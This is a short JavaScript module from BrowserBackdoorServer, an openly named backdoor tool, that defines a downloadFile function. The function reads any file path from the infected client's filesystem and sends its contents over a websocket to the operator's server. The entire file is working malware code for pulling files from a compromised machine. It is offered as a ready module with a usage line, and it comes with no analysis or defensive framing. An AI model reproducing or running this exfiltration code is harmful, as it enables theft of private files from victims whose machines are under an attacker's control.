// INTERACTIVE
/*
 * Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
 * BrowserBackdoorServer by IMcPwn.
 * See the file 'LICENSE' for copying permission
 *
 * Info: Downloads a file from the client
 * Parameters: fullPath, encoding
 * Returns: undefined, error, file
 * Author: IMcPwn
 */

if (typeof fs === typeof undefined) fs = require('fs');

downloadFile = function (fullPath, encoding) {
    fs.readFile(fullPath, encoding, function (err, data) {
        if (err) ws.send(err);
        ws.send(data);
    });
}

return "Usage: downloadFile(fullPath, encoding)";
